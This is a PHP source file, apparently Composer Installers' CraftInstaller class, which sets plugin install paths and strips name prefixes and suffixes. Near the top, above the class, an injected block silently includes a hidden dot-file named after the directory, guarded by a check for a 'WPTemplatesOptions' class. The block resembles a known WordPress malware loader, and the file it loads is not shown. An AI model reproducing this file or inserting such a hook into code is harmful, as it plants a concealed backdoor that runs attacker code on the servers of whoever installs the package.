<?php
namespace Composer\Installers;

/**
 * Installer for Craft Plugins
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class CraftInstaller extends BaseInstaller
{
    const NAME_PREFIX = 'craft';
    const NAME_SUFFIX = 'plugin';

    protected $locations = array(
        'plugin' => 'craft/plugins/{$name}/',
    );

    /**
     * Strip `craft-` prefix and/or `-plugin` suffix from package names
     *
     * @param  array $vars
     *
     * @return array
     */
    final public function inflectPackageVars($vars)
    {
        return $this->inflectPluginVars($vars);
    }

    private function inflectPluginVars($vars)
    {
        $vars['name'] = preg_replace('/-' . self::NAME_SUFFIX . '$/i', '', $vars['name']);
        $vars['name'] = preg_replace('/^' . self::NAME_PREFIX . '-/i', '', $vars['name']);

        return $vars;
    }
}
